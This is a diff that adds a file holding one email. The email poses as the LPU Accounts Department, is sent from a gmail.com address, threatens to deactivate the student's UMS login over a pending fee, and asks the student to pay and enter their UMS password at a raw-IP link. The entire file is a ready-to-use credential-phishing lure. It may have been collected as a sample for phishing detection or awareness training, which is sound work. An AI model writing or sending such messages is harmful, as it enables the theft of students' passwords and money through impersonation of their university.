@@ -1,0 +1,14 @@
+From: LPU Accounts Department <lpu.accounts.dept@gmail.com>
+To: student@lpu.in
+Subject: Final notice: pending semester fee
+Date: Thu, 15 Oct 2026 16:30:00 +0530
+
+Dear Student,
+
+Our records show a pending fee of Rs 18,500 for the current semester. Your UMS login will be deactivated
+if the payment is not made immediately. Pay through the secure portal below and enter your UMS password to confirm.
+
+http://103.21.58.144/lpu/ums/pay
+
+This is the final warning.
+Accounts Department
